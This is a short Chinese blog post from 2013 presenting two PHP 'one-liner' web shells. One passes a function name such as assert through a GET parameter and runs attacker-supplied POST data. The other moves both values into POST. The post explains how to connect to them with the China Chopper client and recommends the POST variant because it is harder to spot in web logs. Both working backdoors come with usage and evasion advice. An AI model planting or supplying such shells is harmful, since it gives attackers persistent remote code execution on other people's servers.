---
layout: post
title: "php一句话变形"
description: ""
category: web
tags: [php, websecurity]
published: true
comments: true
date: 2013-05-19 22:40:59 +0800
---
{% include JB/setup %}

### 前言

最近留了几个一句话都是这种形式的。

```php
<?php($_=@$_GET[2]).@$_($_POST[1])?>
```

使用方法是在菜刀里写`http://localhost/1.php?2=assert`密码是`1`。

### 总结

这样子做在web日志里很明显就可以看出来这是一个一句话。相比于这个更隐蔽的方法是两个参数都使用`POST`来提交。

```php
<?$_POST['1']($_POST['2']);?>
```

在使用时，配置一栏输入`<O>2=assert;</O>`，这样就可以附加提交`2=assert`。

更多强大猥琐的php一句话可以参考这里：http://www.freebuf.com/articles/web/9396.html
